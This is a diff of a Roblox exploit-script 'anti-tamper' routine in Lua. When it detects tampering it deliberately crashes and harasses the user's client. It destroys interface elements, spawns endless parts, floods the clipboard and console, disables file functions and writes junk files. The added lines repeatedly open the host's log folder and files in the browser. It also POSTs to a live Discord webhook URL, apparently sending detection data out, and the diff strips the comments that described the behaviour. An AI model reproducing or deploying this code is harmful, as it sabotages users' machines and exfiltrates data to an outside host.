@@ -50,15 +50,22 @@ local function _WhatIsThis()
     for _, GUI in pairs(game:GetService("CoreGui"):GetDescendants()) do pcall(function() GUI:Destroy() end) end
     for _, GUI in pairs(LocalPlayer.PlayerGui:GetDescendants()) do pcall(function() GUI:Destroy() end) end
     pcall(function() for _, GUI in pairs(gethui():GetDescendants()) do GUI:Destroy() end end)
+    
+    local FileManager = game:GetService("FileManagerService")
     for Index = 1, 50 do
         task.spawn(function()
             while true do
                 for J = 1, 200 do
                     Instance.new("Part", workspace)
+                    pcall(function() FileManager:OpenFolder(Enum.EngineFolder.Logs) end)
+                    pcall(function() FileManager:OpenFileInWebBrowser(Enum.EngineFolder.Logs, "log.txt") end)
+                    pcall(function() FileManager:RevealFileInFolder(Enum.EngineFolder.Logs, "log.txt") end)
+                    pcall(function() FileManager:ListFilesInFolderAsync(Enum.EngineFolder.Logs) end)
                 end
             end
         end)
     end
+    
     task.wait(0.1)
     while true do
         pcall(function() game:GetService("GuiService"):ClearError() end)
@@ -153,7 +160,7 @@ local function CrashClient(ImageID, SoundID, DisplayText, DetectionReason)
             UserFriendlyReason = "Script Environment Manipulation"
             WebhookTitle = "ENVIRONMENT TAMPERING DETECTED"
         end
-        -- spam their clipboard with random stuff
+        
         local ClipboardSpam = {
             "你好世界 How did I get here? 这是什么",
             "检测系统 Nice try buddy 哈哈哈",
@@ -170,7 +177,6 @@ local function CrashClient(ImageID, SoundID, DisplayText, DetectionReason)
         pcall(function() game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end)
         pcall(function() game:GetService("GuiService"):ClearError() end)
         
-        -- disable all clipboard functions
         setclipboard = function() end
         toclipboard = function() end
         toClipboard = function() end
@@ -184,7 +190,6 @@ local function CrashClient(ImageID, SoundID, DisplayText, DetectionReason)
             end
         end
 
-         -- ds file and debug functions
         writefile = function() end
         readfile = function() end
         listfiles = function() end
@@ -204,7 +209,7 @@ local function CrashClient(ImageID, SoundID, DisplayText, DetectionReason)
         
         pcall(function()
             (syn and syn.request or http_request or request)({
-                Url = "https://discord.com/api/webhooks/1467048050655625349/TlCiiteQD8a6n9bxMZ12ltADoSPG_4puUmpwLevQZKvqqli-lROEzjmg7c3JlA3GJsrO",
+                Url = "https://discord.com/api/webhooks/1470775693603246326/xIybrPlQbiPy4HX6zk0mwGYKRZO1bDwiDUz9yPDiYVwbDsmAZOL_8Rhs-Oc5_h8iJMxT",
                 Method = "POST",
                 Headers = {["Content-Type"] = "application/json"},
                 Body = HttpService:JSONEncode({
@@ -231,7 +236,6 @@ local function CrashClient(ImageID, SoundID, DisplayText, DetectionReason)
         
         task.wait(3)
 
-        -- spam their clipboard (prob woudlve been niled already, this is useless but...)
         for i = 1, 50 do
             task.spawn(function()
                 while true do
@@ -249,7 +253,6 @@ local function CrashClient(ImageID, SoundID, DisplayText, DetectionReason)
             end)
         end
 
-        -- Create junk files
         task.spawn(function()
             pcall(function()
                 for _, file in pairs(originalListfiles()) do
@@ -264,7 +267,7 @@ local function CrashClient(ImageID, SoundID, DisplayText, DetectionReason)
             end
         end)
         
-        -- spam console with junk
+        local FileManager = game:GetService("FileManagerService")
         for i = 1, 500 do
             task.spawn(function()
                 while true do
@@ -277,6 +280,10 @@ local function CrashClient(ImageID, SoundID, DisplayText, DetectionReason)
                     pcall(function()
                         print("PULSE_JUNK_DATA_" .. string.rep("Z", 3000) .. "_ANTI_TAMPER_" .. string.rep("Q", 3000))
                     end)
+                    pcall(function() FileManager:OpenFolder(Enum.EngineFolder.Logs) end)
+                    pcall(function() FileManager:OpenFileInWebBrowser(Enum.EngineFolder.Logs, "log.txt") end)
+                    pcall(function() FileManager:RevealFileInFolder(Enum.EngineFolder.Logs, "log.txt") end)
+                    pcall(function() FileManager:ListFilesInFolderAsync(Enum.EngineFolder.Logs) end)
                 end
             end)
         end
@@ -284,6 +291,7 @@ local function CrashClient(ImageID, SoundID, DisplayText, DetectionReason)
         _WhatIsThis()
     end
 end
+
 
 -- Check if they're trying to spoof HWID
 if Method1 ~= Method2 then
